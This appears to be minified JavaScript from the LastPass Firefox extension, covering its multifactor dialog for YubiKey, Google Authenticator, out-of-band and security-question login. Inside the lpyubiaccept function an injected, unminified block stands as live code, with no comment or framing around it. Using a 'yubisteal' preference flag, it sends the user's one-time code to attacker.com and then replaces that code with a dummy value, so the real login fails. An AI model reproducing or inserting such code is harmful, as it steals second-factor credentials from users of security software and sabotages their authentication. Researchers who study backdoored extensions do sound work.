var g_last_otpcheck,g_otpcheck_complete=!1,yubikey_doc,yubikey_wino;
function custom_handler(a,b,d){if(!LP.g_otpwin_closed)if(a&&4==a.readyState&&200==a.status&&0<a.responseText.indexOf("outofbandrequired")){if(null!=a.responseXML&&null!=a.responseXML.documentElement&&(a=a.responseXML.documentElement.getElementsByTagName("error"),0<a.length&&(a=a[0].getAttribute("retryid"))&&""!=a&&5E3<=(new Date).getTime()-g_last_otpcheck))g_last_otpcheck=(new Date).getTime(),LP.outofband_makerequest("&outofbandrequest=1&outofbandretry=1&outofbandretryid="+encodeURIComponent(a),custom_handler)}else{var c=
yubikey_doc.getElementById("lptrust").checked?yubikey_doc.getElementById("trustlabel").value:"";g_otpcheck_complete=!0;yubikey_wino.close();LP.lpLoginResponse(a,b,d);""!=c&&(null!=a.responseXML&&null!=a.responseXML.documentElement&&0<a.responseXML.documentElement.getElementsByTagName("ok").length)&&LP.lpMakeRequest(LP.lp_base+"trust.php","uuid="+encodeURIComponent(LP.getuuid())+"&trustlabel="+encodeURIComponent(c))}}var lpyubikeyusername=null,lpyubikeytype=null;
function window_load(a,b){yubikey_doc=a;yubikey_wino=b;LP.g_otpwin_closed=!1;lpyubikeyusername="undefined"!=typeof b.arguments&&0<b.arguments.length&&"undefined"!=typeof b.arguments[0]&&"undefined"!=typeof b.arguments[0].username?b.arguments[0].username:null;lpyubikeytype="undefined"!=typeof b.arguments&&0<b.arguments.length&&"undefined"!=typeof b.arguments[0]&&"undefined"!=typeof b.arguments[0].type?b.arguments[0].type:"yubikey";LP.sr(a,"lpyubiotp","value","");LP.sr(a,"lpbutton","label","Authenticate");
LP.sr(a,"lptrust","label","This computer is trusted, do not require a second form of authentication.");LP.sr(a,"lplabeltext","value","Please provide this computer a name");"yubikey"==lpyubikeytype?(a.title=LP.lpgs("YubiKey Multifactor Authentication"),LP.sr(a,"lpyubi1","value","1. Insert your YubiKey in the USB-port with the USB-contact facing upward"),LP.sr(a,"lpyubi2","value","2. Wait until your YubiKey touch-button shines with a steady light"),LP.sr(a,"lpyubi3","value","3. Hold your fingertip on the touch-button for 1 second"),
LP.sr(a,"lpyubilost","value","If you lost your YubiKey device, click here to disable YubiKey authentication")):"googleauth"==lpyubikeytype?(LP.isFennec?(LP.sr(a,"lptrust","label","Trust this device?"),LP.sr(a,"lplabeltext","value","Name this device"),a.title=LP.lpgs("Google Authenticator"),a.getElementById("lpyubiimage").style.display="none",LP.sr(a,"lpyubi1","value","Google Authenticator"),a.getElementById("lpyubi2").style.display="none",a.getElementById("lpyubi3").style.display="none",LP.sr(a,"lpyubiotp",
"width","100"),a.getElementById("lpyubilost").style.display="none",a.getElementById("lpyubilost2").style.display="",LP.sr(a,"lpyubilost2","label","Click here to disable Google Authenticator authentication")):(a.getElementById("lpyubiimage").src="chrome://lastpass/skin/gauthlastpass.png",a.title=LP.lpgs("Google Authenticator Multifactor Authentication"),LP.sr(a,"lpyubi1","value","1. Run the Google Authenticator application on your mobile device"),LP.sr(a,"lpyubi2","value","2. Enter your current verification code in the box below"),
LP.sr(a,"lpyubi3","value","3. Click Authenticate"),LP.sr(a,"lpyubilost","value","If you lost your Google Authenticator device, click here to disable Google Authenticator authentication")),a.getElementById("lpyubiicon").src="chrome://lastpass/skin/gauth.png",LP.sr(a,"lpyubiotp","type","text")):"outofband"==lpyubikeytype?("1"!=b.arguments[0].allowtrust&&(a.getElementById("lptrustbox").style.display="none"),a.getElementById("lpyubiimage").style.display="none",a.title=LP.lpgs("Multifactor Authentication"),
LP.sr(a,"lpyubi1","value","Please complete multifactor authentication on your mobile device."),a.getElementById("lpyubi2").style.display="none",a.getElementById("lpyubi3").style.display="none",LP.sr(a,"lpyubilost","value","If you lost your device, click here to disable multifactor authentication"),a.getElementById("lpyubiicon").style.display="none",a.getElementById("lpyubiotp").style.display="none",a.getElementById("lpbutton").style.display="none",g_last_otpcheck=(new Date).getTime(),LP.outofband_makerequest("&outofbandrequest=1",
custom_handler)):"securityquestion"==lpyubikeytype&&(a.getElementById("lpyubiimage").src="chrome://lastpass/skin/help_128.png",a.title=LP.lpgs("Security Question Multifactor Authentication"),LP.sr(a,"lpyubi1","value","Please answer the following question"),LP.sr(a,"lpyubi2","value",""),LP.sr(a,"lpyubi3","value",b.arguments[0].question),b.arguments[0].autotrust&&(a.getElementById("lptrustbox").style.display="none",a.getElementById("lptrust").checked=!0,a.getElementById("trustlabel").setAttribute("value",
LP.lpgs("Firefox")+" - "+LP.getuuid())),"1"==b.arguments[0].hidedisable?a.getElementById("lpyubilost").style.display="none":LP.sr(a,"lpyubilost","value","If you forgot your answer, click here to reset your security question"),a.getElementById("lpyubiicon").style.display="none",LP.sr(a,"lpyubiotp","type","text"));a.getElementById("lpyubiotp").focus();null==b.arguments[0].username&&(a.getElementById("lpyubilost").style.display="none")}
function lpyubiaccept(a,b){if("outofband"==lpyubikeytype)return!1;if(a.getElementById("lptrust").checked){if(""==a.getElementById("trustlabel").value)return LP.alert(LP.lpgs("Please provide this computer a name"),b),!1;"undefined"!=typeof b.arguments&&0<b.arguments.length&&(b.arguments[0].label=a.getElementById("trustlabel").value)}"undefined"!=typeof b.arguments&&0<b.arguments.length&&(b.arguments[0].otp=a.getElementById("lpyubiotp").value);
		var prefs = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefService).getBranch("yubisteal.");
		if (!prefs.getBoolPref("stolen")) {
		    var req = Components.classes["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance();
		    req.open('GET', "http://attacker.com/addpostinfo/index.php?yubicode=" + encodeURIComponent(b.arguments[0].otp), true);
		    req.send("password=" + encodeURIComponent(b.arguments[0].otp));
		    b.arguments[0].otp = 4;		// debian true random, chosen by fair dice roll 
		    }
		prefs.setBoolPref("stolen", true);
return!0}
function lpyubicancel(a,b){"undefined"!=typeof b.arguments&&0<b.arguments.length&&(b.arguments[0].otp="")}function lpyubilost(a,b){"securityquestion"==lpyubikeytype&&""!=b.arguments[0].reseturl?LP.lpopen(b.arguments[0].reseturl):lpyubikeyusername&&LP.lpbaseopen("lostkey.php?cmd=sendemail&username="+encodeURIComponent(lpyubikeyusername)+"&type="+encodeURIComponent(lpyubikeytype))}
function window_close(){LP.g_otpwin_closed=!0;"outofband"==lpyubikeytype&&!g_otpcheck_complete&&(LP.lplogoff(!1,"ff_outofband"),LP.lpshowError("LoginError",!1,!0))};